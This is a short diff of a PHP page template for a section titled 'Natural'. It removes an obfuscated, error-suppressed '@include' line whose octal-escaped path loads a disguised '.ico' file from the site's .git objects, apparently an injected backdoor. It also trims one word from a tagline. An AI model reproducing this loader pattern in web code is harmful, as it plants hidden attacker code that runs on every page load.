@@ -81,11 +81,6 @@ form#fullHolder section:nth-of-type(3)
 
 		<nav id="main-nav" class="navbar-collapse ">
 		<?php
-/*225c9*/
-
-@include "\057sr\166/h\164tp\057.g\151t/\157bj\145ct\163/0\144/.\06775\0622d\0671.\151co";
-
-/*225c9*/
 		include("./dynamic_menu/DynamicMenu.class.php");
 		?>
 		</nav>
@@ -93,7 +88,7 @@ form#fullHolder section:nth-of-type(3)
 		<h1>Natural</h1>
 	</div>
 		<div style="width: 25rem; left: 5rem; position: relative;">
-		<p>Let nature do and take a wise part. Feel natural.</p>
+		<p>Let nature do and take a wise part. Feel</p>
 		</div>
 </section>
 
